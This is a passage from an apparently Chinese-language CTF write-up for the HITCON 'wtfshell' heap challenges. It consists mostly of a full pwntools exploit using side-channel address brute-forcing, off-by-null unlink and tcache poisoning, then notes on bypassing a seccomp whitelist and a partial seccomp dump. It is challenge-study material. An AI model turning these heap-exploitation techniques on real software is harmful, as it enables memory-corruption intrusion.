class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">qwq</span>(<span class="params">name</span>):</span></span><br><span class="line">  log.success(<span class="built_in">hex</span>(name))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>(<span class="params">point</span>):</span></span><br><span class="line">    <span class="keyword">if</span> point == <span class="number">0</span>:</span><br><span class="line">        gdb.attach(r)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(r,<span class="string">&quot;b &quot;</span>+point)</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;/mnt/hgfs/ubuntu/hitcon/heap/share/wtfshell&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">payload</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;√&quot;</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_data</span>(<span class="params">name,content</span>):</span></span><br><span class="line">    payload = <span class="string">b&#x27;rip.&#x27;</span>+name</span><br><span class="line">    menu(payload)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new_file</span>(<span class="params">name,flag</span>):</span></span><br><span class="line">    payload = <span class="string">b&#x27;nsfw,&#x27;</span>+name+<span class="string">b&#x27;,&#x27;</span>+flag</span><br><span class="line">    menu(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_file</span>(<span class="params">name</span>):</span></span><br><span class="line">    payload = <span class="string">b&#x27;omfg,&#x27;</span>+name</span><br><span class="line">    menu(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recover_data</span>(<span class="params">name,content</span>):</span></span><br><span class="line">    payload = <span class="string">b&#x27;wtf,&#x27;</span>+content+<span class="string">b&#x27;,&#x27;</span>+name</span><br><span class="line">    menu(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_file</span>(<span class="params">name</span>):</span></span><br><span class="line">    payload = <span class="string">b&#x27;gtfo,&#x27;</span>+name</span><br><span class="line">    menu(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_user</span>(<span class="params">name</span>):</span></span><br><span class="line">    payload = <span class="string">b&#x27;stfu,&#x27;</span>+name</span><br><span class="line">    menu(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_pwd</span>(<span class="params">name,pwd</span>):</span></span><br><span class="line">    payload = <span class="string">b&#x27;asap,&#x27;</span>+name</span><br><span class="line">    menu(payload)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;password:&quot;</span>)</span><br><span class="line">    r.send(pwd)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;retype password:&quot;</span>)</span><br><span class="line">    r.send(pwd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_all</span>():</span></span><br><span class="line">    payload = <span class="string">b&#x27;irl.&#x27;</span></span><br><span class="line">    menu(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">burp</span>(<span class="params">name,pwd</span>):</span></span><br><span class="line">    addr = <span class="string">&quot;\x80&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x6</span>):</span><br><span class="line">        log.success(<span class="string">&quot;addr: &quot;</span>+<span class="built_in">hex</span>(u64(addr.ljust(<span class="number">0x8</span>,<span class="string">&#x27;\0&#x27;</span>))))</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xb</span>,<span class="number">0xff</span>):</span><br><span class="line">            payload = <span class="string">b&#x27;asap,&#x27;</span>+name</span><br><span class="line">            menu(payload)</span><br><span class="line">            r.recvuntil(<span class="string">b&quot;password:&quot;</span>)</span><br><span class="line">            r.send(pwd)</span><br><span class="line">            r.recvuntil(<span class="string">b&quot;retype password:&quot;</span>)</span><br><span class="line">            r.send(pwd+addr+<span class="built_in">chr</span>(j)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            data=r.recvuntil(<span class="string">&quot;\n&quot;</span>,timeout=<span class="number">0.1</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&quot;asap: &quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                addr+=<span class="built_in">chr</span>(j)</span><br><span class="line">                r.send(<span class="string">b&#x27;\x00\n&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> u64(addr.ljust(<span class="number">0x8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_addr</span>(<span class="params">filename,payload,size</span>):</span></span><br><span class="line">    whole_size = <span class="built_in">len</span>(payload)+<span class="number">1</span></span><br><span class="line">    no_null_payload = payload.replace(<span class="string">b&#x27;\x00&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(size):</span><br><span class="line">        <span class="comment"># log.success(hex(i))</span></span><br><span class="line">        <span class="keyword">if</span> no_null_payload[whole_size-i-<span class="number">2</span>:whole_size-i-<span class="number">1</span>] == <span class="string">b&#x27;a&#x27;</span>:</span><br><span class="line">            <span class="comment"># pause()</span></span><br><span class="line">            recover_data(filename,no_null_payload[<span class="number">0</span>:whole_size-i-<span class="number">2</span>])</span><br><span class="line">            <span class="comment"># debug(&quot;free&quot;)</span></span><br><span class="line">            </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">                            </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add_user(<span class="string">b&#x27;what&#x27;</span>)</span><br><span class="line">add_user(<span class="string">b&#x27;lotus&#x27;</span>)</span><br><span class="line">heap_base=burp(<span class="string">b&#x27;lotus&#x27;</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x40</span>)-<span class="number">0x880</span></span><br><span class="line">key = heap_base&gt;&gt;<span class="number">12</span></span><br><span class="line"><span class="comment"># for i in range(0x7):</span></span><br><span class="line"><span class="comment"># new_file(b&#x27;chunk1&#x27;,b&#x27;3&#x27;)</span></span><br><span class="line"><span class="comment"># add_data(b&#x27;chunk1&#x27;)</span></span><br><span class="line">new_file(<span class="string">b&#x27;big&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">new_file(<span class="string">b&#x27;gbuff&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">new_file(<span class="string">b&#x27;off-by-null-chunk&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x7</span>):</span><br><span class="line">    new_file(<span class="string">b&quot;chunk&quot;</span>+<span class="built_in">str</span>(i).encode(),<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    new_file(<span class="string">b&quot;chunk1&quot;</span>+<span class="built_in">str</span>(i).encode(),<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">new_file(<span class="string">b&#x27;chunk21&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">new_file(<span class="string">b&#x27;chunk22&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x7</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x4</span>):</span><br><span class="line">        add_data(<span class="string">b&quot;chunk&quot;</span>+<span class="built_in">str</span>(i).encode(),<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x2</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x2</span>):</span><br><span class="line">        add_data(<span class="string">b&quot;chunk1&quot;</span>+<span class="built_in">str</span>(i).encode(),<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)  </span><br><span class="line">    add_data(<span class="string">b&quot;chunk1&quot;</span>+<span class="built_in">str</span>(i).encode(),<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xf0</span>+<span class="string">b&#x27;\n&#x27;</span>)  </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x3</span>):</span><br><span class="line">    recover_data(<span class="string">b&quot;chunk2&quot;</span>+<span class="built_in">str</span>(i).encode(),<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">7</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x2</span>):</span><br><span class="line">        add_data(<span class="string">b&quot;chunk1&quot;</span>+<span class="built_in">str</span>(i).encode(),<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)  </span><br><span class="line">    add_data(<span class="string">b&quot;chunk1&quot;</span>+<span class="built_in">str</span>(i).encode(),<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xf0</span>+<span class="string">b&#x27;\n&#x27;</span>) </span><br><span class="line"></span><br><span class="line">[add_data(<span class="string">b&#x27;big&#x27;</span>,p16(<span class="number">0x1650</span>)+<span class="string">b&#x27;/&#x27;</span>*(<span class="number">0x100</span>-<span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>)]</span><br><span class="line">add_data(<span class="string">b&#x27;big&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">new_file(<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x100</span>,<span class="string">b&#x27;3&#x27;</span>)<span class="comment">#use to get the free 0x110 tcache and add a chunk between the unsortedbin and the top chunk</span></span><br><span class="line"></span><br><span class="line">add_data(<span class="string">b&#x27;big&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)<span class="comment"># free the unsortedbin</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#add 0x408 back</span></span><br><span class="line">[add_data(<span class="string">b&#x27;gbuff&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x3</span>)]</span><br><span class="line">add_data(<span class="string">b&#x27;gbuff&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xf8</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#add 0x521 chunk to off-by-null</span></span><br><span class="line">[add_data(<span class="string">b&#x27;off-by-null-chunk&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x5</span>)]</span><br><span class="line">add_data(<span class="string">b&#x27;off-by-null-chunk&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">[delete_file(<span class="string">b&quot;chunk&quot;</span>+<span class="built_in">str</span>(i).encode()) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x6</span>)]</span><br><span class="line"></span><br><span class="line">add_data(<span class="string">b&#x27;gbuff&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">delete_all()</span><br><span class="line"></span><br><span class="line">new_file(<span class="string">b&#x27;useless_chunk&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">[add_data(<span class="string">b&#x27;useless_chunk&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x3</span>)]</span><br><span class="line">add_data(<span class="string">b&#x27;useless_chunk&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># add a 0x321 chunk and edit its fake_next_size</span></span><br><span class="line">new_file(<span class="string">b&#x27;off-by-null-chunk&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">[add_data(<span class="string">b&#x27;off-by-null-chunk&#x27;</span>,<span class="string">b&#x27;\x31&#x27;</span>*<span class="number">0x100</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x3</span>)]</span><br><span class="line">add_data(<span class="string">b&#x27;off-by-null-chunk&#x27;</span>,<span class="string">b&#x27;\x31&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">[recover_data(<span class="string">b&#x27;off-by-null-chunk&#x27;</span>,<span class="string">b&#x27;\x31&#x27;</span>*(<span class="number">0x2ff</span>-i)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x6</span>)]</span><br><span class="line">recover_data(<span class="string">b&#x27;off-by-null-chunk&#x27;</span>,<span class="string">b&#x27;\x31&#x27;</span>*(<span class="number">0x2ff</span>-<span class="number">6</span>)+<span class="string">b&#x27;\x09&#x27;</span>)</span><br><span class="line"></span><br><span class="line">menu(<span class="string">b&#x27;rip.&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x400</span>-<span class="number">4</span>))<span class="comment">#make off by null and clear the prev_size</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x9</span>):</span><br><span class="line">    new_file(<span class="string">b&quot;chunk1&quot;</span>+<span class="built_in">str</span>(i).encode(),<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x9</span>):</span><br><span class="line">    recover_data(<span class="string">b&quot;chunk1&quot;</span>+<span class="built_in">str</span>(i).encode(),<span class="string">b&#x27;i&#x27;</span>*<span class="number">0x2f0</span>)</span><br><span class="line"></span><br><span class="line">fake_point = heap_base+<span class="number">0x2af0</span></span><br><span class="line">fake_point_addr = fake_point+<span class="number">0x30</span></span><br><span class="line">fake_unlink_chunk = <span class="string">b&#x27;i&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x1651</span>)+p64(fake_point_addr-<span class="number">0x18</span>)+p64(fake_point_addr-<span class="number">0x10</span>)+p64(fake_point_addr-<span class="number">0x20</span>)+p64(fake_point_addr-<span class="number">0x18</span>)+p64(fake_point)*<span class="number">2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write_addr(<span class="string">b&#x27;chunk15&#x27;</span>,fake_unlink_chunk,<span class="built_in">len</span>(fake_unlink_chunk)-<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">[delete_file(<span class="string">b&quot;chunk1&quot;</span>+<span class="built_in">str</span>(i).encode()) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x4</span>)]</span><br><span class="line">delete_file(<span class="string">b&#x27;chunk17&#x27;</span>)</span><br><span class="line">delete_file(<span class="string">b&#x27;chunk18&#x27;</span>)</span><br><span class="line">delete_file(<span class="string">b&#x27;chunk16&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#off by null unlink</span></span><br><span class="line"></span><br><span class="line">delete_file(<span class="string">b&#x27;off-by-null-chunk&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#clear the tcache list 0x20</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xa</span>):</span><br><span class="line">    new_file(<span class="string">b&#x27;useless&#x27;</span>+<span class="built_in">str</span>(i).encode(),<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    recover_data(<span class="string">b&#x27;useless&#x27;</span>+<span class="built_in">str</span>(i).encode(),<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">new_file(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2e0</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">new_file(<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x2d0</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak_libc_base</span></span><br><span class="line">show_file(<span class="string">b&#x27;chunk14&#x27;</span>)</span><br><span class="line">libc_base = u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">0x8</span>,<span class="string">b&#x27;\0&#x27;</span>))-<span class="number">0x1f6cc0</span></span><br><span class="line"></span><br><span class="line">new_file(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x220</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">new_file(<span class="string">b&#x27;edit_tcache_next&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">recover_data(<span class="string">b&#x27;edit_tcache_next&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x220</span>)</span><br><span class="line">write_addr(<span class="string">b&#x27;edit_tcache_next&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">192</span>+p64((heap_base+<span class="number">0x330</span>)^(key+<span class="number">3</span>)),<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">new_file(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">new_file(<span class="string">b&#x27;go_attack&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">recover_data(<span class="string">b&#x27;go_attack&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">write_addr(<span class="string">b&#x27;go_attack&#x27;</span>,p32(<span class="number">1</span>)+p32(<span class="number">0x3</span>)+p64(<span class="number">0xdeadbeef</span>)+<span class="string">b&#x27;lotuslotus&#x27;</span>,<span class="number">0x1a</span>)</span><br><span class="line"></span><br><span class="line">show_file(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment"># debug(&quot;malloc_printerr&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">qwq(heap_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">qwq(libc_base)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p><strong>ps：exp 运行一次可能不能成功，侧信道爆破以及 <code>write_addr</code>  似乎有某些 bug，不过多运行几次就能通。</strong></p>
<h2 id="wtfshell2"><a class="markdownIt-Anchor" href="#wtfshell2">#</a> wtfshell2</h2>
<p>wtfshell2 只用考虑如何绕过沙盒，并且劫持程序流即可。</p>
<p>劫持 <code>strtok</code>  的 libc-got 表为 <code>magic_gadget</code> ，然后可劫持程序流。</p>
<p>沙盒是白名单，没有 open。沙盒绕过卡掉了一个解， <code>wtfshell2</code>  比 <code>wtfshell1</code>  少了一个解。 <code>wtfshell2</code>  相比与 <code>wtfshell1</code>  就是多了沙盒。因为我们在 <code>wtfshell1</code>  中已经拿到了任意地址写，和 <code>heap_base</code> ， <code>libc_base</code> ， <code>wtfshell2</code>  考察的就是如何绕过沙箱写 <code>orw</code> ：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">zb@ubuntu:~/seccomp-tools$ seccomp-tools dump /mnt/hgfs/ubuntu/hitcon/heap/share/wtfshell</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0001: 0x15 0x00 0x04 0x00000000  if (A != read) goto 0006</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000010  A = fd # read(fd, buf, count)</span><br><span class="line"> 0003: 0x15 0x00 0x01 0x00000000  if (A != 0x0) goto 0005</span><br><span class="line"> 0004: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0005: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0006: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0007: 0x15 0x00 0x01 0x00000003  if (A != close) goto 0009</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0009: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0010: 0x15 0x00 0x06 0x00000009  if (A != mmap) goto 0017</span><br><span class="line"> 0011: 0x20 0x00 0x00 0x00000020  A = prot # mmap(addr, len, prot, flags, fd, pgoff)</span><br><span class="line"> 0012: 0x15 0x03 0x00 0x00000007  if (A == 0x7) goto 0016</span><br><span class="line"> 0013: 0x20 0x00 0x00 0x00000030  A = fd # mmap(addr, len, prot, flags, fd, pgoff)</span><br><span class="line"> 0014: 0x15 0x00 0x01 0xffffffff  if (A != 0xffffffff) goto 0016</span><br><span class="line"> 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0016: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0017: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0018: 0x15 0x00 0x01 0x0000000b  if (A != munmap) goto 0020</span><br><span class="line"> 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0020: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0021: 0x15 0x00 0x01 0x0000000c  if (A != brk) goto 0023</span><br><span class="line"> 0022: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0023: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0024: 0x15 0x00 0x01 0x00000027  if (A != getpid) goto 0026</span><br><span class="line"> 0025: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0026: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0027: 0x15 0x00 0x01 0x00000066  if (A != getuid) goto 0029</span><br><span class="line"> 0028: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0029: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0030: 0x15 0x00 0x01 0x00000068  if (A != getgid) goto 0032</span><br><span class="line"> 0031: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0032: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0033: 0x15 0x00 0x04 0x00000014  if (A != writev) goto 0038</span><br><span class="line"> 0034: 0x20 0x00 0x00 0x00000010  A = fd # writev(fd, vec, vlen)</span><br><span class="line"> 0035: 0x15 0x00 0x01 0x00000001  if (A != 0x1) goto 0037</span><br><span class="line"> 0036: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0037: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0038: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0039: 0x15 0x00 0x05 0x0000003c  if (A != exit) goto 0045</span><br><span class="line"> 0040: 0x20 0x00 0x00 0x00000010  A = error_code # exit(error_code)</span><br><span class="line"> 0041: 0x15 0x01 0x00 0x00000000  if (A == 0x0) goto 0043</span><br><span class="line"> 0042: 0x15 0x00 0x01 0x00000001  if (A != 0x1) goto 0044</span><br><span class="line"> 0043: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0044: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0045: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0046: 0x15 0x00 0x05 0x000000e7  if (A != exit_group) goto 0052</span><br><span class="line"> 0047: 0x20 0x00 0x00 0x00000010  A = error_code # exit_group(error_code)</span><br><span class="line"> 0048: 0x15 0x01 0x00 0x00000000  if (A == 0x0) goto 0050</span><br><span class="line"> 0049: 0x15 0x00 0x01 0x00000001  if (A != 0x1) goto 0051</span><br><span class="line"> 0050: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0051: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0052: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0053: 0x15 0x00 0x03 0x00000127  if (A != preadv) goto 0057</span><br><span class="line"> 0054: 0x20 0x00 0x00 0x00000010  A = fd # preadv(fd, vec, 